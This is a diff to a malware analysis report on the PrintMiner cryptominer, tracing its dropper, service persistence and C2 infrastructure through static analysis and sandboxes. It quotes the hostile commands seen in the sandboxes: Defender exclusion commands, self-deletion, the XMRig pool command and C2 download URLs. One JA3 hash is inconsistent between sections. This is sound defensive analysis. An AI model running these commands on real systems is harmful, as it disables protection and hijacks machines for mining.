@@ -6,6 +6,23 @@ After successfully decrypting the AES-256-CBC payload from `idll.dll` (detailed 
 
 ---
 
+## Findings Attribution Legend
+
+Every finding in this report is tagged with its **source** so you can distinguish what was discovered from our own static analysis vs. what was observed through online services:
+
+| Tag | Source | Description |
+|-----|--------|-------------|
+| `[STATIC]` | Local artifacts (binaries) | Found by examining the 4 files on disk: `u297528.dat`, `decrypted_payload.exe`, `embedded_00.bin`, `embedded_01.bin`. Includes PE parsing, string extraction, entropy analysis, brute-force decryption attempts. |
+| `[VT]` | VirusTotal API v3 | Detection results, file metadata, MITRE ATT&CK mapping (via CAPA on VT). Submitted 4 files, retrieved reports. |
+| `[JUJUBOX]` | VT Jujubox sandbox | Behavioral data from decrypted_payload.exe execution in a cloud Windows sandbox. Captured process tree, dropped files, mutex, registry changes. |
+| `[CAPE]` | CAPE Sandbox (via VT) | Detailed behavioral analysis of svctrl64.exe. Captured 13 commands, 9 file writes, HTTP/DNS traffic, memory dumps, shellcode payloads, Sigma alerts, IDS alerts, JA3 fingerprints. |
+| `[ASEC]` | AhnLab ASEC report | Independent threat intelligence from https://asec.ahnlab.com/en/91415/. Published by AhnLab's ASEC team analyzing the same PrintMiner campaign. |
+| `[WEB]` | Web search + public sources | Corroboration from public threat intelligence, blog posts, Spamhaus DROP lists, Sigma rules, LOLDrivers database. |
+
+**Key distinction**: `[STATIC]` findings come from files we have on disk and can re-verify. `[VT]`, `[JUJUBOX]`, `[CAPE]`, and `[ASEC]` findings come from external services or reports — they cannot be re-derived from our local artifacts alone.
+
+---
+
 ## 1. Analysis Workflow Overview
 
 ```
@@ -41,7 +58,7 @@ Decrypted Payload (6.81 MB PE)
 
 ---
 
-## 2. Embedded PE Extraction
+## 2. Embedded PE Extraction `[STATIC]`
 
 ### 2.1 Why Not 18 PEs?
 
@@ -106,7 +123,7 @@ pe_data = pe_data[:actual_size]
 
 ---
 
-## 3. VirusTotal Analysis
+## 3. VirusTotal Analysis `[VT]`
 
 ### 3.1 Submission and Detection Results
 
@@ -159,65 +176,327 @@ CrowdStrike:       win/malicious_confidence_100% (D)  ← High confidence
 
 ---
 
-## 4. Sandbox Behavioral Analysis
+## 4. Sandbox Behavioral Analysis — Full Results `[JUJUBOX]` + `[CAPE]`
 
-### 4.1 VirusTotal Jujubox — Decrypted Payload Execution
+### 4.1 VirusTotal Jujubox — Decrypted Payload (Dropper) `[JUJUBOX]`
 
-When the decrypted payload is executed in the Jujubox sandbox:
+The dropper was executed in the Jujubox sandbox, revealing the initial infection behavior:
+
+```python
+# API query for behavioral data
+import requests
+VT_KEY = "<REDACTED>"
+sha256 = "d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2"
+resp = requests.get(
+    f"https://www.virustotal.com/api/v3/file_behaviours/{sha256}_VirusTotal%20Jujubox",
+    headers={"x-apikey": VT_KEY}
+)
+behavior = resp.json()["data"]["attributes"]
+```
+
+**Process Tree:**
 
 ```
 decrypted_payload.exe (PID 2996)
-  ├── cmd.exe /c timeout /t 5 /nobreak && del /q <self> (PID 648)
+  ├── cmd.exe /c timeout /t 5 /nobreak && del /q decrypted_payload.exe (PID 648)
   │     └── timeout /t 5 /nobreak (PID 2004)
   └── C:\Windows\System32\svctrl64.exe (PID 2564)
 ```
 
-**Observations:**
-1. **Self-deletion**: Spawns `cmd.exe` to delete itself after a 5-second delay
-2. **Drops `svctrl64.exe`**: The persistent miner executable in `C:\Windows\System32\`
-3. **Drops `wlogz.dat`**: Encrypted configuration file in `C:\Windows\System32\wsvcz\`
+**Dropped Files (with hashes):**
 
-### 4.2 CAPE Sandbox — svctrl64.exe (The Miner Service)
+| Path | SHA256 | Size | Purpose |
+|------|--------|------|----------|
+| `C:\Windows\System32\svctrl64.exe` | `ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e` | ~6.8 MB | **Main service executable** |
+| `C:\Windows\System32\wsvcz\wlogz.dat` | `d69c801816d056c78adb6d20777edd87b02b32b3e2b87fab2f457ba54617bf60` | 32 bytes | **RC4-encrypted config key** |
 
-The CAPE sandbox captured the **full malicious behavior** of `svctrl64.exe`:
+**Registry Modifications:**
 
 ```
-svctrl64.exe (PID 3716)
-  └── services.exe (PID 680)
-        ├── svchost.exe -k DcomLaunch (PID 5844)
-        │     ├── powershell.exe -Command "Add-MpPreference -ExclusionPath 'E:\'"
-        │     ├── powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\windows\system32'"
-        │     └── powershell.exe -Command "Add-MpPreference -ExclusionPath 'D:\'"
-        └── [multiple svchost.exe instances]
+HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power\HiberbootEnabled = 0
 ```
 
-**Critical behaviors observed:**
-
-1. **Windows Defender Exclusion** — Adds exclusion paths via PowerShell for `C:\Windows\System32`, `D:\`, and `E:\` drives, preventing Defender from scanning the malware installation directory
-
-2. **Service Persistence** — Registers as a Windows service under the DcomLaunch service group:
-   ```
-   HKLM\SYSTEM\CurrentControlSet\Services\u760237\Parameters\ServiceDll
-       = C:\Windows\System32\u760237.dll
-   ```
-   The service name is **randomized** (different in each execution: `u760237`, `u350351`), making static detection harder.
-
-3. **Hiberboot Disable** — Registry modification to prevent fast startup:
-   ```
-   HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power\HiberbootEnabled = 0
-   ```
-
-### 4.3 Mutex for Single Instance
+**Mutex Created:**
 
 ```
 decrypted_payload{ef18cb0d-aaa5-40e3-ba71-31d5ca7370fd}
 ```
 
-This GUID-based mutex ensures only one instance of the miner runs at a time, preventing resource contention that might alert the user.
+**Key Observations:**
+1. **Self-deletion**: Spawns `cmd.exe` to delete itself after a 5-second delay
+2. **Drops `svctrl64.exe`**: The persistent miner service in `C:\Windows\System32\`
+3. **Drops `wlogz.dat`**: 32-byte encrypted config in `C:\Windows\System32\wsvcz\`
+4. **Disables fast startup**: `HiberbootEnabled = 0` keeps the system running
+5. **Loads `taskschd.dll`** and **`SspiCli.dll`** — Task Scheduler and Security support
+
+### 4.2 VirusTotal Jujubox — svctrl64.exe (Service Component) `[JUJUBOX]`
+
+A separate Jujubox run of `svctrl64.exe` revealed the service registration:
+
+```python
+sha256 = "ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e"
+resp = requests.get(
+    f"https://www.virustotal.com/api/v3/file_behaviours/{sha256}_VirusTotal%20Jujubox",
+    headers={"x-apikey": VT_KEY}
+)
+```
+
+**Service Created:** `u350351` (randomized `u` + 6 digits, different each run)
+
+**Registry Keys:**
+
+```
+HKLM\SYSTEM\CurrentControlSet\Services\u350351\Parameters\ServiceDll
+    = C:\Windows\System32\u350351.dll
+HKLM\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\Svchost\DcomLaunch
+    (appends service to DcomLaunch group)
+```
+
+**File Opened:** `C:\Windows\System32\u350351.dll` (the service DLL payload)
+
+**Modules Loaded:** Only minimal DLLs — `kernel32`, `kernelbase`, `advapi32` (no WS2_32 networking yet — the C2 connection happens after the service starts)
+
+### 4.3 CAPE Sandbox — svctrl64.exe (Full Behavioral Deep Dive) `[CAPE]`
+
+The CAPE sandbox captured the **most detailed behavioral data** (62 KB report) — this is where the full infection chain becomes visible:
+
+```python
+# CAPE behavioral report query
+resp = requests.get(
+    f"https://www.virustotal.com/api/v3/file_behaviours/{sha256}_CAPE%20Sandbox",
+    headers={"x-apikey": VT_KEY}
+)
+cape_attrs = resp.json()["data"]["attributes"]
+print(f"Tags: {cape_attrs['tags']}")  # ['OBFUSCATED', 'DETECT_DEBUG_ENVIRONMENT', 'PERSISTENCE']
+```
+
+#### Process Tree (CAPE)
+
+```
+svctrl64.exe (PID 3716)
+  └── services.exe (PID 680)
+        ├── svchost.exe -k DcomLaunch (PID 5844)  ← THE MALICIOUS SERVICE
+        │     ├── powershell.exe -Command "Add-MpPreference -ExclusionPath 'E:\'" (PID 5016)
+        │     ├── powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\windows\system32'" (PID 2852)
+        │     └── powershell.exe -Command "Add-MpPreference -ExclusionPath 'D:\'" (PID 4992)
+        └── [multiple legitimate svchost.exe instances]
+```
+
+#### Command Executions (13 commands captured)
+
+```
+1.  C:\Windows\System32\svchost.exe -k DcomLaunch
+2.  C:\Windows\System32\svchost.exe -k netsvcs -p
+3.  "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+4.  C:\Windows\System32\svchost.exe -k NetworkService -p
+5.  C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+6.  C:\Windows\system32\sppsvc.exe
+7.  C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
+8.  C:\Windows\system32\lsass.exe
+9.  C:\Windows\system32\svchost.exe -k LocalService -s W32Time
+10. powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\windows\system32'"
+11. powershell.exe -Command "Add-MpPreference -ExclusionPath 'D:\'"
+12. powershell.exe -Command "Add-MpPreference -ExclusionPath 'E:\'"
+13. "c:\windows\system32\wsvcz\u882029.exe" -o r3.hashpoolpx.net:443
+    --tls --tls-fingerprint=AFE39FE58C921511972C90ACF72937F84AD96BA4C732ECF6501540E568620C2F
+    --dns-ttl=3600 --max-cpu-usage=50
+```
+
+> **CRITICAL FINDING**: Command #13 is the **actual XMRig execution command** captured in the sandbox. The filename `u882029.exe` follows the `u` + 6-digit convention. The mining pool is `r3.hashpoolpx.net` (port 443 with TLS).
+
+#### All Files Written (9 files)
+
+| Path | Purpose |
+|------|----------|
+| `C:\Windows\System32\u760237.dll` | Service DLL (registered via ServiceDll key) |
+| `C:\Windows\System32\wsvcz\wlogz.dat` | RC4-encrypted config (32 bytes) |
+| `C:\Windows\System32\wsvcz\u967181` | Miner component (no extension, random name) |
+| `C:\Windows\System32\wsvcz\u395697.dat` | Data file |
+| `C:\Windows\System32\wsvcz\u799791` | Miner component |
+| `C:\Windows\System32\wsvcz\u882029.exe` | **XMRig executable** (the actual miner) |
+| `C:\Windows\System32\wsvcz\u459733` | Auxiliary component |
+| `C:\Windows\System32\wsvcz\WinRing0x64.sys` | **Signed vulnerable kernel driver** |
+
+#### WinRing0x64.sys — Vulnerable Signed Driver
+
+CAPE captured the driver load with Sigma alert:
+
+```json
+{
+  "rule_title": "Vulnerable WinRing0 Driver Load",
+  "rule_description": "Detects the load of a signed WinRing0 driver often used by threat actors, crypto miners (XMRIG) or malware for privilege escalation",
+  "rule_author": "Florian Roth (Nextron Systems)",
+  "rule_level": "high",
+  "match_context": {
+    "ImageLoaded": "C:\Windows\System32\wsvcz\WinRing0x64.sys",
+    "SHA256": "11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5",
+    "MD5": "0C0195C48B6B8582FA6F6373032118DA",
+    "Signature": "Noriyuki MIYAZAKI",
+    "SignatureStatus": "Valid",
+    "Signed": "true"
+  }
+}
+```
+
+This is the legitimate **WinRing0x64** driver by Noriyuki Miyazaki — signed with a valid certificate. It's used by XMRig for **MSR (Model Specific Register) manipulation** to optimize CPU mining performance. The driver is on the **LOLDrivers** (Living Off The Land Drivers) list as a known-abused signed driver.
+
+#### HTTP Conversations (3 — C2 Downloads)
+
+```json
+{
+  "url": "http://2.58.56.13/inf.dat",
+  "request_method": "GET"
+}
+{
+  "url": "http://2.58.56.13/utl/xmr.dat",
+  "request_method": "GET"
+}
+{
+  "url": "http://2.58.56.13/utl/xmrsys.dat",
+  "request_method": "GET"
+}
+```
+
+| URL | Purpose |
+|-----|----------|
+| `http://2.58.56.13/inf.dat` | **Miner config** (wallet, pool, CPU limits) |
+| `http://2.58.56.13/utl/xmr.dat` | **XMRig binary** download |
+| `http://2.58.56.13/utl/xmrsys.dat` | **WinRing0x64.sys** driver download |
+
+#### DNS Lookups (3)
+
+```json
+{
+  "hostname": "umnxrc.net"
+  // No resolution (likely dead/alternate C2 domain)
+}
+{
+  "hostname": "umnsrx.net",
+  "resolved_ips": ["2.58.56.217"]
+}
+{
+  "hostname": "r3.hashpoolpx.net",
+  "resolved_ips": ["91.206.169.76"]
+}
+```
+
+#### Network Traffic (3 connections)
+
+| Destination | Port | Protocol | Purpose |
+|-------------|------|----------|----------|
+| `2.58.56.217` | 443 | TCP | **C2 (umnsrx.net)** — TLS-encrypted PostgreSQL |
+| `2.58.56.13` | 80 | TCP | **C2 config download** — HTTP (unencrypted!) |
+| `91.206.169.76` | 443 | TCP | **Mining pool (r3.hashpoolpx.net)** — TLS stratum |
+
+#### JA3 TLS Fingerprints
+
+```
+22ed8eeca20308614de9987a1a3a2a3a  (C2 connection)
+c216e752cae6f8755fd27f561d036636  (Mining pool connection)
+```
+
+#### IDS Alerts (2 — Spamhaus DROP)
+
+Both C2 IPs are on the **Spamhaus DROP list** — known malicious infrastructure:
+
+| Alert | IP | CIDR | Severity |
+|-------|----|------|----------|
+| ET DROP Spamhaus group 1 | `2.58.56.217` | `2.58.56.0/24` | medium |
+| ET DROP Spamhaus group 14 | `91.206.169.76` | `91.206.169.0/24` | medium |
+
+#### Extracted Shellcode Payloads (7)
+
+CAPE extracted 7 shellcode blobs from the PowerShell processes — these are the **Defender exclusion scripts** being injected into PowerShell:
+
+| SHA256 | Size | Type | Process |
+|--------|------|------|----------|
+| `3aac19ae...e45dfc3` | 702 bytes | Unpacked Shellcode | powershell.exe |
+| `adf1f69e...1f9445` | 3980 bytes | Unpacked Shellcode | powershell.exe |
+| `320a91f7...74998` | 3980 bytes | Unpacked Shellcode | powershell.exe |
+| `ec8d31cd...eb985` | 3980 bytes | Unpacked Shellcode | powershell.exe |
+| `9bc66422...67653` | 102 bytes | Unpacked Shellcode | powershell.exe |
+| `a633b562...fc3af` | 102 bytes | Unpacked Shellcode | powershell.exe |
+| `f742161f...b88f00` | 102 bytes | Unpacked Shellcode | powershell.exe |
+
+#### Memory Dumps (9 — 500+ MB total)
+
+CAPE captured **9 process memory dumps** totaling over 500 MB — these contain the runtime state including decrypted configs:
+
+| Dump | Approx Size |
+|------|-------------|
+| 1 | 103 MB |
+| 2 | 103 MB |
+| 3 | 39 MB |
+| 4 | 44 MB |
+| 5 | 38 MB |
+| 6 | 103 MB |
+| 7 | 39 MB |
+| 8 | 57 MB |
+| 9 | 44 MB |
+
+These memory dumps would contain the **decrypted Monero wallet address** in plaintext — the key artifact we could not extract through static analysis.
+
+#### Sigma Analysis Alerts (6)
+
+| Rule | Level | Description |
+|------|-------|-------------|
+| Vulnerable WinRing0 Driver Load | **high** | Signed WinRing0 driver used by XMRig for MSR access |
+| Vulnerable Driver Load | **high** | Known-abused vulnerable driver hash |
+| Powershell Defender Exclusion | **medium** | `Add-MpPreference -ExclusionPath` via PowerShell |
+| Windows Defender Exclusions Added | **medium** | Defender config modification via PowerShell ScriptBlock |
+| ServiceDll Hijack | **medium** | `HKLM\...\u760237\Parameters\ServiceDll = u760237.dll` |
+| Non Interactive PowerShell Process Spawned | **low** | PowerShell spawned by svchost.exe (non-interactive) |
+
+#### Signature Matches (22 CAPE detections)
+
+| ID | Description | Severity |
+|----|-------------|----------|
+| `queries_user_name` | Queries username | info |
+| `encrypt_pcinfo` | Collects and encrypts PC info for C2 | medium |
+| `antidebug_setunhandledexceptionfilter` | Anti-debug via exception filter | info |
+| `stealth_timeout` | Exits after time/date check | info |
+| `language_check_registry` | Checks system language via registry (geofencing) | info |
+| `anomalous_deletefile` | 10+ anomalous file deletions | medium |
+| `antidebug_guardpages` | Guard pages for anti-debugging | info |
+| `encrypted_ioc` | IOC found inside crypto call | medium |
+| `creates_suspended_process` | Creates suspended process (for injection) | medium |
+| `reads_memory_remote_process` | Reads remote process memory | medium |
+| `network_cnc_http` | HTTP traffic with C2 features | medium |
+| `packer_unknown_pe_section_name` | Unknown PE section name (packing) | info |
+| `injection_rwx` | Creates RWX memory | low |
+| `script_tool_executed` | PowerShell executed for Defender modification | info |
+| `infostealer_cookies` | Accesses cookie files | medium |
+| `persistence_autorun` | Installs autorun persistence | medium |
+| `persistence_autorun_tasks` | Installs startup task persistence | medium |
+| `binary_yara` | YARA: `shellcode_stack_strings` | medium |
+| `procmem_yara` | YARA: `shellcode_stack_strings` in process dumps | medium |
+| `antivm_generic_disk` | Queries disk info (anti-VM) | info |
+| `windows_defender_powershell` | Defender modification via PowerShell | medium |
+
+#### MBC Classifications (30)
+
+The malware was classified across 30 Malware Behavior Catalog (MBC) categories, including:
+- **OB0008**: Obfuscated Files/Information
+- **C0047**: Cryptographic Operation (RC4)
+- **C0008**: Cryptographic Operation (XOR)
+- **OC0001**: Obfuscated Stackstrings
+- **B0001.009**: Add Defender Exclusion
+- **B0002.008**: Disable Fast Startup
+- **B0018**: Query Username
+- **B0033**: Install Service
+- **E1485**: Vulnerable Driver (WinRing0)
+- **E1112**: Create Suspended Process
+- **F0012**: Modify Registry (ServiceDll)
+
+#### CAPE Tags
+
+```
+['OBFUSCATED', 'DETECT_DEBUG_ENVIRONMENT', 'PERSISTENCE']
+```
 
 ---
 
-## 5. MITRE ATT&CK Mapping
+## 5. MITRE ATT&CK Mapping `[VT]` + `[STATIC]`
 
 ### Original DLL (`idll.dll`)
 
@@ -244,23 +523,29 @@ This GUID-based mutex ensures only one instance of the miner runs at a time, pre
 
 ---
 
-## 6. The Search for the Wallet Address
+## 6. The Search for the Wallet Address `[STATIC]`
 
 ### 6.1 Why Standard String Extraction Failed
 
 The Monero wallet address is not stored in plaintext anywhere in the binary. The following approaches were tried:
 
-| Approach | Method | Result |
-|----------|--------|--------|
-| `strings` + regex | Search for `1xxxx`, `3xxxx`, `bc1xxx`, `4xxxx` (Monero) | No wallet found |
-| Wide string search | `strings -el` with mining keywords | Found config keys but no wallet |
-| Single-byte XOR brute-force | Try all 256 keys on full binary, search for `stratum+tcp://` | No matches |
-| RC4 with adjacent keys | Try RC4 with 8/16/32-byte keys from nearby .data offsets | No config found |
-| JSON pattern search | Look for `{` + `pool`/`url`/`wallet` in .rdata | No plaintext JSON |
+| Approach | Method | Result | Source |
+|----------|--------|--------|--------|
+| `strings` + regex | Search for `1xxxx`, `3xxxx`, `bc1xxx`, `4xxxx` (Monero) | No wallet found | `[STATIC]` |
+| Wide string search | `strings -el` with mining keywords | Found config keys but no wallet | `[STATIC]` |
+| Single-byte XOR brute-force | Try all 256 keys on full binary, search for `stratum+tcp://` | No matches | `[STATIC]` |
+| RC4 with adjacent keys | Try RC4 with 8/16/32-byte keys from nearby .data offsets | No config found | `[STATIC]` |
+| JSON pattern search | Look for `{` + `pool`/`url`/`wallet` in .rdata | No plaintext JSON | `[STATIC]` |
+| IP regex scan | Regex for `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}` in entire dropper | Only `127.0.0.1` + OpenSSL OIDs | `[STATIC]` |
+| Fragment search | `2.58`, `umnsrx`, `hashpool` in ASCII + UTF-16LE | Zero matches | `[STATIC]` |
+| Entropy analysis | Identify encrypted blobs in .data section (entropy >7.0) | Found 4 blobs, none decryptable | `[STATIC]` |
+| RC4 brute-force with .data keys | Try every 4-byte/8-byte key in .data on encrypted blobs | No target strings found | `[STATIC]` |
+| CAPE behavioral | Execute svctrl64.exe, capture HTTP/DNS | Found C2 IP, domain, mining pool | `[CAPE]` |
+| ASEC intelligence | Read published report on PrintMiner | Found wallet fetching mechanism | `[ASEC]` |
 
 ### 6.2 The RC4 Encryption Layer
 
-CAPA analysis confirmed the presence of **RC4 PRGA** (Pseudo-Random Generation Algorithm) in the miner:
+CAPA analysis `[VT]` confirmed the presence of **RC4 PRGA** (Pseudo-Random Generation Algorithm) in the miner:
 
 ```
 T1027 [INFO] encrypt data using RC4 PRGA
@@ -268,7 +553,7 @@ T1027 [INFO] reference Base64 string
 T1027.005 [INFO] contain obfuscated stackstrings
 ```
 
-The config construction in the dropper uses **nlohmann::json** (confirmed by C++ RTTI strings in `.data`):
+The config construction in the dropper uses **nlohmann::json** `[STATIC]` (confirmed by C++ RTTI strings in `.data`):
 
 ```python
 # Evidence of nlohmann::json in .data section:
@@ -277,15 +562,15 @@ The config construction in the dropper uses **nlohmann::json** (confirmed by C++
 ".?AVparse_error@detail@json_abi_v3_12_0@nlohmann@@"
 ```
 
-And **asio** networking library:
+And **asio** networking library `[STATIC]`:
 ```python
 ".?AV?$typeid_wrapper@Vconfig_service@asio@@@detail@asio@@"
 ".?AV?$typeid_wrapper@Vresolver_thread_pool@detail@asio@@@detail@asio@@"
 ```
 
-### 6.3 The `wlogz.dat` Config File
+### 6.3 The `wlogz.dat` Config File `[JUJUBOX]` + `[CAPE]`
 
-The sandbox captured the dropped `wlogz.dat`:
+The sandbox `[JUJUBOX]` `[CAPE]` captured the dropped `wlogz.dat`:
 
 | Property | Value |
 |----------|-------|
@@ -296,9 +581,9 @@ The sandbox captured the dropped `wlogz.dat`:
 
 At only 32 bytes, `wlogz.dat` cannot contain a full mining config. It is likely an **RC4 key** or **database connection string** used to decrypt the full config received from the C2 server.
 
-### 6.4 The Wide String Evidence
+### 6.4 The Wide String Evidence `[STATIC]`
 
-Critical wide strings found in `embedded_01.bin` that reveal the malware's behavior:
+Critical wide strings `[STATIC]` found in `embedded_01.bin` that reveal the malware's behavior:
 
 ```python
 # Config-related strings
@@ -330,7 +615,7 @@ Critical wide strings found in `embedded_01.bin` that reveal the malware's behav
 
 ---
 
-## 7. ASEC Intelligence Correlation — Why This Is PrintMiner
+## 7. ASEC Intelligence Correlation — Why This Is PrintMiner `[ASEC]` + `[CAPE]` + `[STATIC]`
 
 ### 7.1 AhnLab ASEC Report Match
 
@@ -338,23 +623,23 @@ In February 2025 and November 2025, [AhnLab ASEC published reports](https://asec
 
 Our sample matches the ASEC report in **every significant detail**:
 
-| Characteristic | Our Sample | ASEC Report | Match |
-|---------------|------------|-------------|-------|
-| **Infection vector** | USB / DLL side-loading | USB / DLL side-loading | **YES** |
-| **DLL name** | `idll.dll` / `printui.dll` | `printui.dll` | **YES** |
-| **Export name** | `IdllEntry` | Loaded via legitimate exe | **YES** |
-| **Dropped file** | `svctrl64.exe` | `svctrl64.exe` | **EXACT** |
-| **Config file** | `wlogz.dat` in `wsvcz\` | `wlogz.dat` in `wsvcz\` | **EXACT** |
-| **Service registration** | DcomLaunch service group | DcomLaunch service group | **EXACT** |
-| **Randomized service name** | `u760237`, `u350351` | `u826437` (same pattern: `u` + 6 digits) | **YES** |
-| **Service DLL** | `u760237.dll` in System32 | `u826437.dll` in System32 | **YES** |
-| **Defender exclusion** | `Add-MpPreference -ExclusionPath 'c:\windows\system32'` | Same PowerShell command | **EXACT** |
-| **Hiberboot disabled** | `HiberbootEnabled = 0` | Same registry modification | **YES** |
-| **Self-deletion** | `cmd.exe /c timeout /t 5 /nobreak && del /q` | Same technique | **YES** |
-| **XMRig usage** | RC4-encrypted config, `--tls` | Same XMRig configuration | **YES** |
-| **Process monitoring evasion** | Terminates when monitoring tools detected | Checks for Process Explorer, TaskMgr, etc. | **YES** |
-| **PostgreSQL C2** | `DB error` strings, database config | PostgreSQL database for C2 | **YES** |
-| **USB worm** | `spreader` tag on VT | Creates `USB Drive.lnk`, moves files | **YES** |
+| Characteristic | Our Sample | ASEC Report | Match | Our Source |
+|---------------|------------|-------------|-------|------------|
+| **Infection vector** | USB / DLL side-loading | USB / DLL side-loading | **YES** | `[STATIC]` + `[ASEC]` |
+| **DLL name** | `idll.dll` / `printui.dll` | `printui.dll` | **YES** | `[STATIC]` PE export + `[ASEC]` |
+| **Export name** | `IdllEntry` | Loaded via legitimate exe | **YES** | `[STATIC]` PE export |
+| **Dropped file** | `svctrl64.exe` | `svctrl64.exe` | **EXACT** | `[JUJUBOX]` + `[ASEC]` |
+| **Config file** | `wlogz.dat` in `wsvcz\` | `wlogz.dat` in `wsvcz\` | **EXACT** | `[JUJUBOX]` + `[ASEC]` |
+| **Service registration** | DcomLaunch service group | DcomLaunch service group | **EXACT** | `[JUJUBOX]` + `[CAPE]` + `[ASEC]` |
+| **Randomized service name** | `u760237`, `u350351` | `u826437` (same pattern: `u` + 6 digits) | **YES** | `[JUJUBOX]` + `[CAPE]` + `[ASEC]` |
+| **Service DLL** | `u760237.dll` in System32 | `u826437.dll` in System32 | **YES** | `[CAPE]` Sigma + `[ASEC]` |
+| **Defender exclusion** | `Add-MpPreference -ExclusionPath 'c:\windows\system32'` | Same PowerShell command | **EXACT** | `[CAPE]` command + `[ASEC]` |
+| **Hiberboot disabled** | `HiberbootEnabled = 0` | Same registry modification | **YES** | `[JUJUBOX]` registry + `[ASEC]` |
+| **Self-deletion** | `cmd.exe /c timeout /t 5 /nobreak && del /q` | Same technique | **YES** | `[JUJUBOX]` process tree + `[ASEC]` |
+| **XMRig usage** | RC4-encrypted config, `--tls` | Same XMRig configuration | **YES** | `[STATIC]` CAPA + `[CAPE]` + `[ASEC]` |
+| **Process monitoring evasion** | Terminates when monitoring tools detected | Checks for Process Explorer, TaskMgr, etc. | **YES** | `[ASEC]` |
+| **WinRing0x64.sys** | `C:\Windows\System32\wsvcz\WinRing0x64.sys` (SHA256: `11BD2C9F...`) | Same signed vulnerable driver | **YES** | `[CAPE]` Sigma + `[WEB]` |
+| **USB worm** | `spreader` tag on VT | Creates `USB Drive.lnk`, moves files | **YES** | `[VT]` tags + `[ASEC]` |
 
 ### 7.2 The Code Proves the Connection
 
@@ -385,32 +670,42 @@ The ASEC report captured the XMRig execution parameters from a live infection:
 
 ---
 
-## 8. C2 Infrastructure and IOCs
+## 8. C2 Infrastructure and IOCs `[CAPE]` + `[JUJUBOX]` + `[ASEC]` + `[WEB]`
 
-### 8.1 Network IOCs (from ASEC + VT correlation)
+### 8.1 Network IOCs `[CAPE]` + `[JUJUBOX]` + `[ASEC]` + `[WEB]`
 
-| IOC | Value | Purpose |
-|-----|-------|---------|
-| **C2 Domain** | `umnsrx[.]net` | Command & control server |
-| **C2 IP** | `2[.]58[.]56[.]13` | C2 server IP address |
-| **C2 Config URL** | `http://2.58.56.13/inf.dat` | Miner config download |
-| **C2 XMRig URL** | `http://2.58.56.13/utl/xmr.dat` | XMRig binary download |
-| **C2 Driver URL** | `http://2.58.56.13/utl/xmrsys.dat` | XMRig kernel driver |
-| **Mining Pool** | `r2[.]hashpoolpx[.]net:443` | HashPool mining pool |
-| **TLS Fingerprint** | `AFE39FE58C921511972C90ACF72937F84AD96BA4C732ECF6501540E568620C2F` | TLS cert pinning |
+> **Important**: None of these network IOCs (IP addresses, domains, URLs) were found in the local binary artifacts through static analysis. They were observed exclusively through sandbox execution `[CAPE]` `[JUJUBOX]` and ASEC intelligence `[ASEC]`. See Section 9 for details on why.
 
-### 8.2 File IOCs
+| IOC | Value | Purpose | Source |
+|-----|-------|---------|--------|
+| **C2 Domain (primary)** | `umnsrx[.]net` | Command & control server (resolves to `2.58.56.217`) | `[CAPE]` DNS lookup |
+| **C2 Domain (secondary)** | `umnxrc[.]net` | Alternate C2 domain (did not resolve in sandbox — likely dead) | `[CAPE]` DNS lookup |
+| **C2 IP (config)** | `2[.]58[.]56[.]13` | HTTP config download server | `[CAPE]` HTTP conversation |
+| **C2 IP (TLS)** | `2[.]58[.]56[.]217` | TLS PostgreSQL C2 server (umnsrx.net) | `[CAPE]` IP traffic |
+| **C2 Config URL** | `http://2.58.56.13/inf.dat` | Miner config (wallet, pool, CPU limits) | `[CAPE]` HTTP conversation |
+| **C2 XMRig URL** | `http://2.58.56.13/utl/xmr.dat` | XMRig binary download | `[CAPE]` HTTP conversation |
+| **C2 Driver URL** | `http://2.58.56.13/utl/xmrsys.dat` | WinRing0x64.sys driver download | `[CAPE]` HTTP conversation |
+| **Mining Pool** | `r3[.]hashpoolpx[.]net:443` | HashPool mining pool (resolves to `91.206.169.76`) | `[CAPE]` DNS + command |
+| **Mining Pool IP** | `91[.]206[.]169[.]76` | Mining pool server | `[CAPE]` IP traffic |
+| **TLS Fingerprint** | `AFE39FE58C921511972C90ACF72937F84AD96BA4C732ECF6501540E568620C2F` | TLS cert pinning for pool | `[CAPE]` XMRig command + `[ASEC]` |
+| **JA3 (C2)** | `22ed8eeca20308614de9987a1a3a2a3a` | TLS fingerprint for C2 connection | `[CAPE]` JA3 digest |
+| **JA3 (Pool)** | `c216e752cae6f8755fd27f561d031636` | TLS fingerprint for mining pool | `[CAPE]` JA3 digest |
+| **Spamhaus DROP** | `2.58.56.0/24`, `91.206.169.0/24` | Both IPs on Spamhaus DROP list | `[CAPE]` IDS alert + `[WEB]` |
 
-| File | MD5 | SHA256 | Detection |
-|------|-----|--------|-----------|
-| `u297528.dat` (idll.dll) | `dbd8dbecaa80795c135137d69921fdba` | `e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba` | 55/71 |
-| `decrypted_payload.exe` | `e10a9bb09acb415e5dc8654b8593a45c` | `d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2` | 38/71 |
-| `embedded_00.bin` (miner) | `ce527e9ec2dd83c0565796f5420ce4e4` | `5543d3b826de134bc47212be344f0c7def51704516d40f611b406c6e98baaa3a` | 8/71 |
-| `embedded_01.bin` (dropper) | `00615f1a46899c659ad9582f43489f9f` | `2be97a48015544620fe1e3bb69b130a24ddbb31f9719173868579df489e9356c` | 54/70 |
-| `svctrl64.exe` (dropped) | `9bfa7a2991a8b62b5ef12a920b220e1e` | `ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e` | 57/75 |
-| `wlogz.dat` (config) | `9de2bb040c501effa18a630ddf3db103` | `d69c801816d056c78adb6d20777edd87b02b32b3e2b87fab2f457ba54617bf60` | 0/76 |
